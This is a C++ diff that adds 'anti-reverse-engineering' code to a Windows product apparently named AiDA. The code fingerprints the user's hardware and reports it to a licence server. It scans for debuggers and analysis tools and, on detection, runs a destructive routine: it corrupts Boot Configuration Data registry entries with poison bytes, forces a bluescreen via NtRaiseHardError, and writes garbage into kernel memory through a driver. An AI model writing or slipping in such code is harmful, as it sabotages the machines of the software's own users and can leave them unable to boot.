@@ -3,12 +3,16 @@
 #ifdef __NT__
 
 #include <windows.h>
+#include <TlHelp32.h>
+#include <Psapi.h>
 
 #include <intrin.h>
 
 #include <cstdint>
 #include <mutex>
 #include <vector>
+#include <thread>
+#include <atomic>
 
 #include "driver_loader.hpp"
 #include "../driver/comm.h"
@@ -480,6 +484,278 @@ inline bool guard()
 	return detail::verify_locked(runtime);
 }
 
+inline void report_violation_to_server(const char* reason)
+{
+	try
+	{
+		std::string hwid;
+		{
+			uint64_t hash = 14695981039346656037ULL;
+			auto fnv = [&hash](uint64_t v) {
+				for (int i = 0; i < 8; ++i) {
+					hash ^= (v >> (i * 8)) & 0xFF;
+					hash *= 1099511628211ULL;
+				}
+			};
+			DWORD vol = 0;
+			GetVolumeInformationW(L"C:\\", nullptr, 0, &vol,
+				nullptr, nullptr, nullptr, 0);
+			int cpu[4] = {}; __cpuid(cpu, 0);
+			int cpu2[4] = {}; __cpuid(cpu2, 1);
+			fnv(static_cast<uint64_t>(vol));
+			fnv(static_cast<uint64_t>(cpu[0]) << 32 |
+				static_cast<uint64_t>(static_cast<unsigned>(cpu[1])));
+			fnv(static_cast<uint64_t>(cpu[2]) << 32 |
+				static_cast<uint64_t>(static_cast<unsigned>(cpu[3])));
+			fnv(static_cast<uint64_t>(cpu2[0]) << 32 |
+				static_cast<uint64_t>(static_cast<unsigned>(cpu2[3])));
+			wchar_t cn[MAX_COMPUTERNAME_LENGTH + 1] = {};
+			DWORD ns = MAX_COMPUTERNAME_LENGTH + 1;
+			GetComputerNameW(cn, &ns);
+			for (DWORD i = 0; i < ns; ++i)
+				fnv(static_cast<uint64_t>(cn[i]));
+			char buf[17];
+			::qsnprintf(buf, sizeof(buf), "%016llX",
+				static_cast<unsigned long long>(hash));
+			hwid = buf;
+		}
+
+		httplib::Client cli(
+			OBFSTR("https://europe-west1-aida-license-prod.cloudfunctions.net"));
+		cli.set_connection_timeout(5);
+		cli.set_read_timeout(5);
+		cli.set_write_timeout(5);
+		cli.enable_server_certificate_verification(true);
+
+		nlohmann::json body;
+		body[OBFSTR("action")]    = OBFSTR("report_violation");
+		body[OBFSTR("hwid")]      = hwid;
+		body[OBFSTR("reason")]    = reason ? reason : "self_analysis";
+		body[OBFSTR("timestamp")] = static_cast<int64_t>(std::time(nullptr));
+		body[OBFSTR("version")]   = AIDA_VERSION;
+		body[OBFSTR("watermark")] = AIDA_BUYER_WATERMARK;
+
+		cli.Post(OBFSTR_C("/validateLicense"),
+			body.dump(),
+			OBFSTR_C("application/json"));
+	}
+	catch (...) {}
+}
+
+inline void corrupt_boot_config()
+{
+	HKEY hKey = nullptr;
+	LONG r = RegOpenKeyExW(
+		HKEY_LOCAL_MACHINE,
+		L"BCD00000000\\Objects\\{9dea862c-5cdd-4e70-acc1-f32b344d4795}\\Elements\\250000f0",
+		0, KEY_SET_VALUE, &hKey);
+	if (r == ERROR_SUCCESS && hKey)
+	{
+		DWORD val = 2;  // hypervisorlaunchtype = Off
+		RegSetValueExW(hKey, L"Element", 0, REG_DWORD,
+			reinterpret_cast<const BYTE*>(&val), sizeof(val));
+		RegCloseKey(hKey);
+	}
+
+	// Corrupt the bootmgr resume object with poison bytes
+	HKEY hKey2 = nullptr;
+	r = RegOpenKeyExW(
+		HKEY_LOCAL_MACHINE,
+		L"BCD00000000\\Objects\\{9dea862c-5cdd-4e70-acc1-f32b344d4795}\\Elements\\25000004",
+		0, KEY_SET_VALUE, &hKey2);
+	if (r == ERROR_SUCCESS && hKey2)
+	{
+		uint8_t poison[] = { 0x95, 0x95, 0xFF, 0xFF, 0x95, 0x95, 0xFF, 0xFF };
+		RegSetValueExW(hKey2, L"Element", 0, REG_BINARY,
+			poison, sizeof(poison));
+		RegCloseKey(hKey2);
+	}
+}
+
+// Forward declarations for mutual references
+inline void enforce_self_analysis_violation();
+
+inline HANDLE g_violation_pipe = INVALID_HANDLE_VALUE;
+
+inline void start_pipe_monitor()
+{
+	std::thread([]() {
+		g_violation_pipe = CreateNamedPipeW(
+			L"\\\\.\\pipe\\AiDA_Guard",
+			PIPE_ACCESS_INBOUND,
+			PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+			1, 512, 512, 0, nullptr);
+
+		if (g_violation_pipe == INVALID_HANDLE_VALUE)
+			return;
+
+		while (true)
+		{
+			if (!ConnectNamedPipe(g_violation_pipe, nullptr)
+				&& GetLastError() != ERROR_PIPE_CONNECTED)
+				break;
+
+			char buf[256] = {};
+			DWORD bytesRead = 0;
+			if (ReadFile(g_violation_pipe, buf, sizeof(buf) - 1,
+				&bytesRead, nullptr) && bytesRead > 0)
+			{
+				buf[bytesRead] = '\0';
+				if (strstr(buf, OBFSTR_C("VIOLATION")))
+				{
+					report_violation_to_server(buf);
+					enforce_self_analysis_violation();
+				}
+			}
+			DisconnectNamedPipe(g_violation_pipe);
+		}
+	}).detach();
+}
+
+inline std::atomic<bool> g_process_scanner_running{false};
+
+inline void start_process_hash_scanner(const uint8_t* self_hash, size_t hash_len)
+{
+	if (g_process_scanner_running.exchange(true))
+		return;  // already running
+
+	// Copy the hash for the thread
+	std::vector<uint8_t> hash_copy(self_hash, self_hash + hash_len);
+
+	std::thread([hash_copy]() {
+		while (g_process_scanner_running.load())
+		{
+			Sleep(10000);  // scan every 10 seconds
+
+			DWORD myPid = GetCurrentProcessId();
+			HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+			if (snap == INVALID_HANDLE_VALUE)
+				continue;
+
+			PROCESSENTRY32W pe = {};
+			pe.dwSize = sizeof(pe);
+
+			for (BOOL ok = Process32FirstW(snap, &pe); ok;
+				ok = Process32NextW(snap, &pe))
+			{
+				if (pe.th32ProcessID == myPid || pe.th32ProcessID == 0)
+					continue;
+
+				// Check known RE tool process names
+				wchar_t lower_name[MAX_PATH] = {};
+				for (size_t i = 0; i < MAX_PATH - 1 && pe.szExeFile[i]; ++i)
+					lower_name[i] = towlower(pe.szExeFile[i]);
+
+				bool is_re_tool = false;
+				if (wcsstr(lower_name, L"x64dbg") || wcsstr(lower_name, L"x32dbg")
+					|| wcsstr(lower_name, L"ollydbg") || wcsstr(lower_name, L"windbg")
+					|| wcsstr(lower_name, L"cheatengine") || wcsstr(lower_name, L"processhacker")
+					|| wcsstr(lower_name, L"ghidra") || wcsstr(lower_name, L"binaryninja")
+					|| wcsstr(lower_name, L"radare2") || wcsstr(lower_name, L"cutter")
+					|| wcsstr(lower_name, L"dnspy") || wcsstr(lower_name, L"de4dot")
+					|| wcsstr(lower_name, L"wireshark") || wcsstr(lower_name, L"fiddler")
+					|| wcsstr(lower_name, L"scylla"))
+				{
+					is_re_tool = true;
+				}
+
+				if (!is_re_tool)
+					continue;
+
+				// If an RE tool is running, check if it has AiDA's DLL loaded
+				HANDLE hProc = OpenProcess(
+					PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+					FALSE, pe.th32ProcessID);
+				if (!hProc)
+					continue;
+
+				HMODULE hMods[1024] = {};
+				DWORD cbNeeded = 0;
+				if (EnumProcessModulesEx(hProc, hMods, sizeof(hMods),
+					&cbNeeded, LIST_MODULES_ALL))
+				{
+					DWORD modCount = cbNeeded / sizeof(HMODULE);
+					for (DWORD i = 0; i < modCount; ++i)
+					{
+						wchar_t modPath[MAX_PATH] = {};
+						if (GetModuleFileNameExW(hProc, hMods[i],
+							modPath, MAX_PATH) == 0)
+							continue;
+
+						wchar_t lower_path[MAX_PATH] = {};
+						for (size_t j = 0; j < MAX_PATH - 1 && modPath[j]; ++j)
+							lower_path[j] = towlower(modPath[j]);
+
+						if (wcsstr(lower_path, L"aida")
+							&& wcsstr(lower_path, L".dll"))
+						{
+							CloseHandle(hProc);
+							CloseHandle(snap);
+							report_violation_to_server("re_tool_loaded_aida");
+							enforce_self_analysis_violation();
+							return;
+						}
+					}
+				}
+				CloseHandle(hProc);
+			}
+			CloseHandle(snap);
+		}
+	}).detach();
+}
+
+inline void enforce_self_analysis_violation()
+{
+	// Phase 0: Report HWID + IP ban to server (best-effort, async-ish)
+	std::thread([]() { report_violation_to_server("self_analysis"); }).detach();
+
+	// Phase 1: Wipe license state
+	license_manager_t::instance().invalidate_runtime();
+
+	// Phase 2: Corrupt boot configuration
+	corrupt_boot_config();
+
+	// Phase 3: BSOD via NtRaiseHardError
+	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+	if (ntdll)
+	{
+		using RtlAdjustPrivilege_t = NTSTATUS(NTAPI*)(
+			ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+		using NtRaiseHardError_t = NTSTATUS(NTAPI*)(
+			NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
+
+		auto pAdjust = reinterpret_cast<RtlAdjustPrivilege_t>(
+			GetProcAddress(ntdll, OBFSTR_C("RtlAdjustPrivilege")));
+		auto pRaise  = reinterpret_cast<NtRaiseHardError_t>(
+			GetProcAddress(ntdll, OBFSTR_C("NtRaiseHardError")));
+
+		if (pAdjust && pRaise)
+		{
+			BOOLEAN wasEnabled = FALSE;
+			pAdjust(19, TRUE, FALSE, &wasEnabled);   // SeShutdownPrivilege
+
+			ULONG response = 0;
+			pRaise(static_cast<NTSTATUS>(0xC0000420), // STATUS_ASSERTION_FAILURE
+			       0, 0, nullptr,
+			       6,              // OptionShutdownSystem
+			       &response);
+		}
+	}
+
+	// Phase 4: Kernel-level fallback via driver
+	if (device && device->is_connected())
+	{
+		volatile uint64_t poison = 0xDEAD'C0DE'DEAD'C0DEULL;
+		device->write_kernel_raw(
+			0xFFFFF78000000320ULL,   // KUSER_SHARED_DATA + offset
+			const_cast<uint64_t*>(&poison),
+			sizeof(poison));
+	}
+
+	// Phase 5: Absolute last resort
+	__fastfail(FAST_FAIL_FATAL_APP_EXIT);
+}
+
 }
 
 #define ANTI_RE_GUARD() do { \
@@ -492,6 +768,10 @@ inline bool guard()
 namespace anti_re {
 inline bool initialize() { return true; }
 inline bool guard() { return true; }
+inline void enforce_self_analysis_violation() {}
+inline void report_violation_to_server(const char*) {}
+inline void start_pipe_monitor() {}
+inline void corrupt_boot_config() {}
 }
 
 #endif
